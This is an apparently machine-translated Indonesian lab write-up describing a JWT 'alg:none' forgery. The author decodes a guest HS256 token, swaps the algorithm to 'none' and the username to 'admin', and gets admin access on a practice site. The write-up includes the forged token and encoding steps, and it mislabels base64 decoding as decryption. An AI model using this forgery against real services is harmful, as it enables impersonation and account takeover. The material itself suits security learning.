---
title: "JWT Token"
description: "Kegagalan Integritas: Jika Anda menemukan Token JWT dengan kunci penandatanganan seperti HS256, Anda dapat mencoba menggunakannya untuk meniru pengguna lain. Token JWT kami adalah sebagai berikut: masuk sebagai tamu di..."
lang: "id"
translationKey: "jwt-token"
category: "lab-writeups"
tags: []
publishDate: "2024-08-29"
draft: true
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "624b8c28-b9cc-4288-8dbe-ee9ee8fd5afa"
notionUrl: "https://app.notion.com/p/JWT-Token-624b8c28b9cc42888dbeee9ee8fd5afa"
notionLastEdited: "2024-08-29T04:29:00.000Z"
---

# Kegagalan Integritas

Jika Anda menemukan Token JWT dengan kunci penandatanganan seperti (misalnya HS256), Anda dapat mencobanya untuk meniru pengguna lain. Token JWT kami adalah sebagai berikut:

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzI0ODk5NTk0fQ.3hWqwGtmLH75cN8QAwqEnex93gCPb08BsxNIbO_UZuY

# hasil decrypt
{"typ":"JWT","alg":"HS256"}{"username":"guest","exp":1724899594}
áZ¬¶bÇï
ñ

```

Masuk sebagai tamu di sebuah situs web:


![](/images/jwt-token/faea54d8fbc4.png)

Kemudian kami ingin meniru sebagai admin dan mencoba memanipulasi token JWT per segmen seperti ini.

```bash
### Segment 1
#Decode :
{"typ":"JWT","alg":"none"}
#Encode :
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=
### Segment 2
#Decode :
{"username":"admin","exp":1724899594}
#Encode :
eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI0ODk5NTk0fQ==

### Hasil akhir
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI0ODk5NTk0fQ==.
```

Tada, kita dapat admin!!!!

![](/images/jwt-token/162a4f8ac22b.png)
